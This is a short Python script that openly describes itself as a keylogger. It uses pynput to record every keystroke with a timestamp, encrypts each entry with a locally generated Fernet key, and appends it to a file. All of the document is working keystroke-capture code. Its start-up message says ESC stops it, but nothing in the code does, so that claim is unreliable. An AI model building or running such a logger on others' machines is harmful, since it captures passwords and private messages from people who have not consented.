# Make sure to install pynput library before running this script by running the following command:
#  pip install pynput
# pip install pynput cryptography


import os
import time
from pynput import keyboard
from cryptography.fernet import Fernet

LOG_FILE = "keyfile_encrypted.txt"
KEY_FILE = "encryption_key.key"

# Generate or load encryption key


def load_or_generate_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, 'rb') as key_file:
            return key_file.read()
    else:
        key = Fernet.generate_key()
        with open(KEY_FILE, 'wb') as key_file:
            key_file.write(key)
        return key


ENCRYPTION_KEY = load_or_generate_key()
cipher = Fernet(ENCRYPTION_KEY)


def encrypt_text(text):
    """Encrypts the given text using AES encryption."""
    return cipher.encrypt(text.encode())


def keyPressed(key):
    """Handles key press events, logs them with timestamps, and encrypts the data."""
    try:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        key_data = f"[{timestamp}] "

        if hasattr(key, 'char') and key.char is not None:
            key_data += key.char
        else:
            special_keys = {
                keyboard.Key.space: ' [SPACE] ',
                keyboard.Key.enter: ' [ENTER]\n',
                keyboard.Key.backspace: ' [BACKSPACE] ',
                keyboard.Key.tab: ' [TAB] ',
                keyboard.Key.shift: ' [SHIFT] ',
                keyboard.Key.ctrl: ' [CTRL] ',
                keyboard.Key.alt: ' [ALT] ',
                keyboard.Key.esc: ' [ESC] ',
            }
            key_data += special_keys.get(key, f" [{str(key)}] ")

        encrypted_data = encrypt_text(key_data + "\n")

        with open(LOG_FILE, 'ab') as logKey:
            logKey.write(encrypted_data + b'\n')

    except Exception as e:
        print(f"Error logging key: {e}")


def main():
    """Starts the keylogger listener."""
    print("Keylogger started... Press ESC to stop.")
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()


if __name__ == "__main__":
    main()
